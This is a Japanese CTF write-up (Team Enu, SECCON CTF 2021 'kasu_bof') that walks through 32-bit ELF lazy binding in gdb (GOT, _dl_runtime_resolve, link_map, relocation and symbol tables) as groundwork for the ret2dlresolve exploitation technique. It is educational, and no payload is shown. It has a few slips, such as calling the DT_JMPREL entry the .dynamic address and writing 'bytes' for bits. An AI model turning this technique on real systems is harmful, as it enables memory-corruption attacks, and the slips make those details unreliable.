<!DOCTYPE html>
<html lang="ja-jp">

    <head><title>SECCON CTF 2021 - kasu_bof Writeup &ndash; Team Enu</title>
<meta name="description" content="Team EnuのWriteupや活動の紹介を掲載しています。">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="UTF-8"/>



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />


<link rel="stylesheet" href="http://localhost:8080/css/palettes/base16-dark.css">
<link rel="stylesheet" href="http://localhost:8080/css/risotto.css">
<link rel="stylesheet" href="http://localhost:8080/css/custom.css">
</head>

    <body>
        <div class="page">

            <header class="page__header"><h1 class="page__logo"><a href="http://localhost:8080" class="page__logo-inner">Team Enu</a></h1>
<nav class="page__nav main-nav">
    <ul>
    
    
    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/writeups/" title="">Writeups</a></li>
    
    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/news/" title="">News</a></li>
    
    </ul>
</nav>

</header>

    ここで、 <code>0x804c004</code> および <code>0x804c008</code> 番地には何が格納されているのか調べてみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  hexdump dword 0x804c004
0x0804c004│+0x0000   &lt;_GLOBAL_OFFSET_TABLE_+0004&gt; 0xf7ffd990   
0x0804c008│+0x0004   &lt;_GLOBAL_OFFSET_TABLE_+0008&gt; 0xf7fe7ac0</code></pre></div>
</div>
<p>
すると、これらのアドレスはGOT先頭付近のアドレスであり、それぞれ <code>0xf7ffd990</code> と <code>0xf7fe7ac0</code> の値が格納されていることがわかる。
</p>
<p>
    まとめると、 <code>.plt</code> の先頭の命令では、スタックに <code>0xf7ffd990</code> を積み、 <code>0xf7fe7ac0</code> 番地へジャンプしている。
    そして、 <code>0xf7fe7ac0</code> へジャンプ後、 <code>gets</code> のアドレスが解決され、 <code>gets</code> が実行される。
    また、二回目以降の呼び出しのために、解決されたアドレスは、GOTへ格納される。
</p>
<p>
    以上が <code>main</code> から <code>gets</code> が実行されるまでの流れであり、 <code>return to dl resolve</code> をするために必要となる <code>.plt</code> セクション以降の流れについて以降では詳しく見ていく。
</p>
<h4 id="headline-9">
<code>.plt</code> セクションからアドレス解決の流れ
</h4>
<p>
さて、 <code>main</code> から <code>gets</code> が呼び出される全体像が掴めたところで、最後にジャンプしたアドレス <code>0xf7fe7ac0</code> から先を追ってみる。
</p>
<p>
    ジャンプ先の <code>0xf7fe7ac0</code> は <code>_dl_runtime_resolve</code> となっており、この関数により <code>gets</code> のアドレスが解決される。
     <code>_dl_runtime_resolve</code> は引数として <code>link_map</code> 構造体と、後述する <code>Elf32_Rel</code> 構造体へのオフセットを示す <code>reloc_arg</code> という2つの値を取る。
</p>
<p>
    そこで、ここから先では、 <code>_dl_runtime_resolve</code> を呼び出す際にスタックに積まれた <code>0xf7ffd990</code> を <code>_dl_runtime_resolve</code> の第一引数である <code>link_map</code> 構造体のアドレス、 <code>0x0</code> を第二引数である <code>reloc_arg</code> として扱う。
</p>
<p>
それでは、次にライブラリ関数の名前解決をする際に必要な情報を含んでいるそれぞれのセクションについて調べていく。    
</p>
<h5 id="headline-10">
<code>.dynamic</code> セクション
</h5>
<p>
<code>.dynamic</code> セクションは、 <code>.rel.plt</code> や <code>.dynsym</code> , <code>.dynstr</code> セクションなどのアドレス情報を保持しているセクションである。
</p>
<p>
  このため、ライブラリ関数の名前解決をする際は、このセクションを最初に参照し、名前解決に必要な情報が含まれるセクションの配置されているアドレスを取得する。
</p>
<p>
  <code>.dynamic</code> セクションは、 <code>ELF32_Dyn</code> 構造体のエントリが連続して配置されている。
</p>
<p>
  そこで、 <code>ELF32_Dyn</code> 構造体の定義をgdbで参照してみる。
</p>
<p>
  gdbから、構造体の定義を得るために、libcにおけるデバッグ情報を取得しておく。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ sudo apt install libc6-dbg libc6-dbg:i386</code></pre></div>
</div>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  break main
gef➤  run
gef➤  info types Elf32_Dyn
All types matching regular expression &#34;Elf32_Dyn&#34;:

File ../elf/elf.h:
838:    typedef struct {...} Elf32_Dyn;gef➤  info types Elf32_Dyn
All types matching regular expression &#34;Elf32_Dyn&#34;:

File ../elf/elf.h:
838:    typedef struct {...} Elf32_Dyn;
gef➤  ptype /o Elf32_Dyn
type = struct {
/*    0      |     4 */    Elf32_Sword d_tag;
/*    4      |     4 */    union {
/*                 4 */        Elf32_Word d_val;
/*                 4 */        Elf32_Addr d_ptr;

                            /* total size (bytes):    4 */
                        } d_un;

                        /* total size (bytes):    8 */
                      }</code></pre></div>
</div>
<ul>
<li>
<p>
ソースコードにおける定義
</p>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L840">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L840</a>
</p>
</li>
</ul>
</li>
</ul>
<p>
  <code>Elf32_Dyn</code> 構造体は、 それぞれの構造体がどのセクションの何の情報を持つのか表す識別子である <code>d_tag</code> と、 <code>d_tag</code> に対応した値を <code>union</code> 型として持つ。
</p>
<p>
  ここで、 <code>.dynamic</code> セクションを参照するため、このセクションのそのもののアドレスを得るためには、 <code>link_map</code> 構造体の <code>l_info</code> フィールドを参照する必要がある。
</p>
<p>
  そこで、次に <code>link_map</code> 構造体の構造と、 <code>.dynamic</code> セクションそのもののアドレスを解決する流れを見ていく。 
</p>
<h6 id="headline-11">
<code>link_map</code> 構造体
</h6>
<p>
<code>link_map</code> 構造体は、ELFファイルと実際にマッピングされたアドレスの差分や各セクションのアドレス、再配置情報を保持する構造体であり、ライブラリ関数のシンボルを解決する際に参照される。
</p>
<p>
   それでは、 <code>link_map</code> 構造体の構造を知るために、gdbを用いて定義を参照してみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types link_map
All types matching regular expression &#34;link_map&#34;:

File ../elf/link.h:
84:	struct link_map_public;

File ../include/link.h:
91:	struct link_map;
271:	struct link_map_reldeps;

File ../sysdeps/x86/linkmap.h:
10:	struct link_map_machine;
gef➤  ptype /o struct link_map
/* offset    |  size */  type = struct link_map {
/*    0      |     4 */    Elf32_Addr l_addr;
/*    4      |     4 */    char *l_name;
/*    8      |     4 */    Elf32_Dyn *l_ld;
/*   12      |     4 */    struct link_map *l_next;
/*   16      |     4 */    struct link_map *l_prev;
/*   20      |     4 */    struct link_map *l_real;
/*   24      |     4 */    Lmid_t l_ns;
/*   28      |     4 */    struct libname_list *l_libname;
/*   32      |   308 */    Elf32_Dyn *l_info[77];
/*  340      |     4 */    const Elf32_Phdr *l_phdr;
...</code></pre></div>
</div>
<ul>
<li>
<p>
ソースコードの定義はここ
</p>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/include/link.h#L95">https://elixir.bootlin.com/glibc/glibc-2.36/source/include/link.h#L95</a>
</p>
</li>
</ul>
<p>
<strong>return to dl resolve</strong> において、 <code>link_map</code> 構造体の <code>offset</code> が32の位置に保持されている <code>l_info</code> フィールドを利用する。
 <code>l_info</code> は、各セクションへのアドレスを保持している。
</p>
<p>
各セクションが格納されている <code>l_info</code> のインデックスは、 <code>d_tag</code> に格納される。
</p>
<ul>
<li>
<p>
d_tagに代入されうる値の一覧
</p>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862</a>
</p>
<div class="src src-c">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* Legal values for d_tag (dynamic entry type).  */</span>
...
<span style="color:#75715e">#define DT_STRTAB	5		</span><span style="color:#75715e">/* Address of string table */</span><span style="color:#75715e">
</span><span style="color:#75715e">#define DT_SYMTAB	6		</span><span style="color:#75715e">/* Address of symbol table */</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>...
<span style="color:#75715e">#define DT_REL	17		</span><span style="color:#75715e">/* Address of Rel relocs */</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>...
<span style="color:#75715e">#define DT_JMPREL	23		</span><span style="color:#75715e">/* Address of PLT relocs */</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>...</code></pre></div>
</div>
</li>
</ul>
</li>
</ul>
<p>
例えば、 <code>.dynamic</code> セクションのアドレスを参照したい場合、 <code>d_tag</code> が <code>DT_JMPREL</code> の <code>Elf32_Dyn</code> 構造体を参照すればよいため、 <code>l_info[23]</code> とすることで参照することができる。
</p>
</li>
</ul>
<p>
ここで、実際にgdbを用いて <code>link_map</code> 構造体から <code>.dynamic</code> セクションのアドレスを解決してみる。
</p>
<p>
   <code>_dl_runtime_resolve</code> の第一引数である <code>0xf7ffd990</code> は <code>link_map</code> 構造体のアドレスであるため、 <code>0xf7ffd990</code> を <code>link_map</code> 構造体のアドレスとし、表示する。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $link_map = (struct link_map*) 0xf7ffd990
gef➤  print *$link_map.l_info[23]
$5 = {
d_tag = 0x17,
d_un = {
 d_val = 0x80482d8,
 d_ptr = 0x80482d8
}
}</code></pre></div>
</div>
<p>
   すると <code>link_map</code> 構造体のそれぞれのメンバの値が確認できる。
   例えば、 <code>dynamic</code> セクションのアドレス情報は、 <code>l_info[23]</code> を参照することにより得ることができる。
   このため、これを表示してみると、 <code>d_ptr</code> には <code>0x80482d8</code> が格納されており、 <code>.dynamic</code> セクションのアドレスは <code>0x80482d8</code> だということがわかる。
</p>
<p>
   それでは、次にライブラリ関数の名前解決に必要な他のセクションの情報を参照していく。
</p>
<h5 id="headline-12">
<code>.rel.plt</code> セクション
</h5>
<p>
<code>rel.plt</code> セクションは、解決したアドレスを格納するGOTのアドレスとシンボルの情報を得るために必要な情報を持つ。
</p>
<p>
  <code>rel.plt</code> セクションは、 <code>Elf32_Rel</code> 構造体の配列となっており、 <code>Elf32_Rel</code> 構造体の定義は以下のようになっている。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types Elf32_Rel
All types matching regular expression &#34;Elf32_Rel&#34;:

File ../elf/elf.h:
638:    typedef struct {...} Elf32_Rel;
658:    typedef struct {...} Elf32_Rela;
gef➤  ptype /o Elf32_Rel
type = struct {
/*    0      |     4 */    Elf32_Addr r_offset;
/*    4      |     4 */    Elf32_Word r_info;

                         /* total size (bytes):    8 */
                       }</code></pre></div>
</div>
<ul>
<li>
<p>
ソースコード
</p>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L634">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L634</a>
</p>
</li>
</ul>
<p>
<code>.dynamic</code> セクションから取得した <code>.rel.plt</code> のアドレス先をgdbでダンプしてみる。
ここで、 <code>dl_runtime_resolve</code> の第二引数である <code>reloc_arg</code> は、 <code>.rel.plt</code> セクションの先頭アドレスから、参照する <code>Elf32_Rel</code> 構造体までのオフセットとなっている。
</p>
</li>
</ul>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $reloc_arg = 0x0
gef➤  set $reloc = (Elf32_Rel *)($link_map.l_info[23].d_un.d_ptr + $reloc_arg)
gef➤  print *reloc
$11 = {
r_offset = 0x804c00c,
r_info = 0x107
}</code></pre></div>
</div>
<p>
    ここで、 <code>r_offset</code> はライブラリ関数のアドレスを解決後に、そのアドレスを格納するGOT領域のエントリとなる。
    このため、 <code>gets</code> のアドレスが解決されると、 <code>0x804c00c</code> にそのアドレスが格納されることになる。
</p>
<p>
    <code>r_info</code> は、シンボルを解決するために使用される。
    <code>r_info</code> を 8 byte 右シフトすることにより、 <code>.dynsym</code> のインデックスを取得することができる。
</p>
<div class="src src-c">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* How to extract and insert information held in the r_info field.  */</span>

<span style="color:#75715e">#define ELF32_R_SYM(val)		((val) &gt;&gt; 8)
</span><span style="color:#75715e">#define ELF32_R_TYPE(val)		((val) &amp; 0xff)
</span><span style="color:#75715e">#define ELF32_R_INFO(sym, type)	(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></code></pre></div>
</div>
<h5 id="headline-13">
<code>.dynsym</code> セクション
</h5>
<p>
<code>.dynsym</code> セクションは、アドレス解決する関数のシンボルのサイズやオフセットなどの情報を持つ。
</p>
<p>
    また、 <code>.dynsym</code> セクションは、 <code>Elf32_Sym</code> 構造体の配列となっている。
</p>
<p>
     <code>Elf32_Sym</code> 構造体をgdbで参照してみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types Elf32_Sym
All types matching regular expression &#34;Elf32_Sym&#34;:

File ../elf/elf.h:
527:    typedef struct {...} Elf32_Sym;
gef➤  ptype /o Elf32_Sym
type = struct {
/*    0      |     4 */    Elf32_Word st_name;
/*    4      |     4 */    Elf32_Addr st_value;
/*    8      |     4 */    Elf32_Word st_size;
/*   12      |     1 */    unsigned char st_info;
/*   13      |     1 */    unsigned char st_other;
/*   14      |     2 */    Elf32_Section st_shndx;

                      /* total size (bytes):   16 */
                    }</code></pre></div>
</div>
<ul>
<li>
<p>
ソースコード
</p>
</li>
</ul>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L519">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L519</a>
</p>
<p>
  ここで、 <code>st_name</code> は、実際にシンボルが置かれている <code>.dynstr</code> セクションのオフセットを指している。
 そこで、 <code>r_info</code> からインデックスを計算し、実際に <code>Elf32_Sym</code> のアドレスを特定してみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $symtab = (Elf32_Sym *)($link_map.l_info[6].d_un.d_ptr)
gef➤  set $sym = $symtab[$reloc.r_info&gt;&gt;8]
gef➤  print $sym
$13 = {
st_name = 0x1a,
st_value = 0x0,
st_size = 0x0,
st_info = 0x12,
st_other = 0x0,
st_shndx = 0x0
}</code></pre></div>
</div>
</li>
</ul>
